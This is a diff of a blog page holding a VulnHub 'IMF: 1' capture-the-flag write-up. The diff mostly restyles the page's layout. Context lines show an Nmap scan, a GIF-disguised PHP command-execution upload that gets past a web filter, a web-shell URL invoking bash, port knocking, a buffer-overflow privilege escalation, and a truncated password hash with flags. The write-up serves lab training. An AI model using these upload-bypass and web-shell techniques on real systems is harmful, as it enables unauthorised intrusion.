@@ -7,7 +7,7 @@
     <meta content="width=device-width, initial-scale=1" name="viewport"/>
     <title>मंथन | Manthan</title>
     <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.invisibletree.css"/>
     <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
     <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
     <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
@@ -20,23 +20,13 @@
     <script charset="UTF-8" src="/static/js/go.min.js"></script>
    </head>
   <body>
-    <div class="header">
-      <span class="menu_left"><a class="menu_home" href="/index.html">मंथन</a></span>
-      <span class="menu_right"><table>
-        <tr>
-          <td><a class="menu_archive" href="/archive.html">Archive</a></td><td>|</td>
-          <td><a class="menu_tags" href="/tags.html">Tags</a></td><td>|</td>
-          <td><a class="menu_stats" href="/stats.html">Stats</a></td>
-        </tr>
-      </table></span>
-      <br/><br/>
-    </div>
     <div class="body">
-      <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] IMF: 1</h1>
+      <div class="content">
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] IMF: 1</h1>
           <p style="float:left;"><a href="/posts/20190920_vulnhub-vulnix.html"> « </a>📅 published on <code>26/Sep/2019</code><a href="/posts/20190927_vulnhub-hackme.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/imf-1,162/">IMF: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_imf/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -44,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_imf/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass">exploit_php_fileupload_bypass</a>, <a href="https://github.com/7h3rAm/writeups#privesc_bof">privesc_bof</a>  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Sun Sep 22 12:16:22 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.imf/results/192.168.92.178/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.imf/results/192.168.92.178/scans/xml/_quick_tcp_nmap.xml 192.168.92.178
 Nmap scan report for 192.168.92.178
@@ -133,7 +123,7 @@ http://192.168.92.178/imfadministrator/cms.php?pagename=home
 http://192.168.92.178/imfadministrator/images/whiteboard.jpg
 http://192.168.92.178/imfadministrator/uploadr942.php
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. The <code>http://192.168.92.178/imfadministrator/uploadr942.php</code> page has a file upload functionality. We tried different methods to evade the <code>CrappyWAF</code> filters and ended up using a minimal command execution page with GIF header and extension as the final payload. Once the file is uploaded, it's destination file name is leaked within HTML comments on the result page. We can use this uploaded file to get command execution:  </p>
 <pre class="nested"><code>cat cmd.gif
   GIF89a
@@ -158,7 +148,7 @@ http://192.168.92.178/imfadministrator/uploads/bf76ad6d6afc.gif?cmd=bash%20shell
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_imf/screenshot14.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_imf/screenshot15.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>www-data@imf&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@imf&gt;  
@@ -179,7 +169,7 @@ www-data@imf&gt; users
 root
 setup
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. Using <code>flag5</code> as a reference, we search for files with name <code>agent</code> and find two hits. Upon exploring the <code>agent</code> binary it is found that it is also running as a service and bound to <code>7788/tcp</code>. Since the port is not exposed outside and <code>knockd</code> daemon is also running, it is assumed that there is a port knocking requirement here. We also find a <code>access_codes</code> file with the required sequence of ports to knock. Upon trying this sequence, we were unable to get the <code>7788/tcp</code> port opened and continued further:  </p>
 <pre class="nested"><code>find / -name agent 2&gt;/dev/null
   /usr/local/bin/agent
@@ -220,7 +210,7 @@ cat /root/TheEnd.txt
 <p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_imf/screenshot25.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.5.2" src="/static/files/posts_vulnhub_imf/screenshot26.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.5.3" src="/static/files/posts_vulnhub_imf/screenshot27.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>setup:$6$PR5zOqWk$3MKXMgf6.4bLlznh0R87RB4qaOAcGhbE0Cs8xtUqVPHP8x0553/6aMZnfsZOWKXL0DOqUcVRkfCQN8Dvj........................
 </code></pre>
@@ -235,22 +225,65 @@ flag4{dXBsb2Fkcjk0Mi5......
 flag5{YWdlbnRzZXJ2aWN......
 flag6{R2gwc3RQcm90MGM......
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/imf-1,162/">https://www.vulnhub.com/entry/imf-1,162/</a>  </li>
 <li><a href="https://g0blin.co.uk/imf-vulnhub-writeup/">https://g0blin.co.uk/imf-vulnhub-writeup/</a>  </li>
 </ul>
+    <hr>
           <p style="float:left;">« <a href="/posts/20190920_vulnhub-vulnix.html">[VulnHub] HackLAB: Vulnix</a> «</p>
       <p style="float:right;">» <a href="/posts/20190927_vulnhub-hackme.html">[VulnHub] hackme: 1</a> »</p>
-        </div>
-    <div BG_CLIPART_STYLE_HERE></div>
-    <div class="footer footercenter">
-      <span>
-        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
-      </span>
+          </div>
+      <div class="menu">
+        <h1 class="h1"><a class="menu_home" href="/index.html">मंथन</a></h1>
+          <ul class="active nested">
+            <li><a class="menu_archive" href="/archive.html">💾 Archive</a><ul class="active nested">
+              <li><a href=/pages/research.html>🔬 Research</a></li>
+              <li><a href=/pages/cv.html>📄 Curriculum Vitae</a></li>
+              <li><a href=/pages/satview.html>🛰️ Satellite Views</a></li>
+              <li><a href=/pages/fitness.html>🏋️ Fitness</a></li>
+              <li><a href=/pages/life.html>🧘 Life</a></li>
+            </ul></li>
+            <li><a class="menu_tags" href="/tags.html">🔖 Tags</a><ul class="active nested">
+                            <li><a href="/tags.html#code">code</a></li>
+                            <li><a href="/tags.html#ctf">ctf</a></li>
+                            <li><a href="/tags.html#exploit">exploit</a></li>
+                            <li><a href="/tags.html#hackthebox">hackthebox</a></li>
+                            <li><a href="/tags.html#reversing">reversing</a></li>
+                            <li><a href="/tags.html#tryhackme">tryhackme</a></li>
+                            <li><a href="/tags.html#vulnhub">vulnhub</a></li>
+                            <li><a href="/tags.html#vulnweekends">vulnweekends</a></li>
+                            <li><a href="/tags.html#writeup">writeup</a></li>
+                          </ul></li>
+            <li><a class="menu_stats" href="/stats.html">📊 Stats</a></li>
+          </ul>
+      </div>
+      <div class="footer footercenter"><span><a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a></span></div>
+      <script>hljs.initHighlightingOnLoad();</script>
+      <script>hljs.initLineNumbersOnLoad();</script>
+      <script>
+        function toggle(s){
+          s.classList.toggle("expanded");
+          var t=!1,i=!1,a=!1;
+          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
+          for(var l=s.nextElementSibling;l;){
+            if(t&&l.classList.contains("h2")){
+              l.classList.toggle("active");
+              break
+            }
+            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
+              l.classList.toggle("active");
+              break
+            }
+            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
+              l.classList.toggle("active");
+              break
+            }
+            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+          }
+        }
+      </script>
     </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
+    <div id="bgclipart"></div>
   </body>
 </html>
